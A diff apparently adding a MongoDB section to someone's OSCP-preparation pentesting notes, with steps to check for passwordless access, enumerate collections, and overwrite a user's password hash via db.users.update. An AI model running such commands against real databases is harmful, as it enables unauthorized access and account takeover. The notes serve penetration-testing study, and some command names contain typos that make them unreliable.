@@ -81,6 +81,17 @@ POSTGRES - Port 5432:
   - Similar machine nibles in pg paractice.
   - Reference: https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
   
+MONGO DB - Port 27017:
+  - mongo mongodb://<ip>:<port> - Check for password less login
+  - Commands:
+    - show db
+    - show table
+    - db.table.find().pretty()
+    - db.users.update({_id:ObjectId("5f73c575eae85a15b8df908d"}), {$set: {"password":"1df38cbe202365fc6f2265391ef6aad4e52c7c09ce837bd191e4081b8749e341"}})
+    - we cannot run, victim shell via mongo db.
+    
+  
+  
   
 * these ports didn't serve a great deal in gaining initial shell as per OSCP prep, and hence should be less on priority.
 
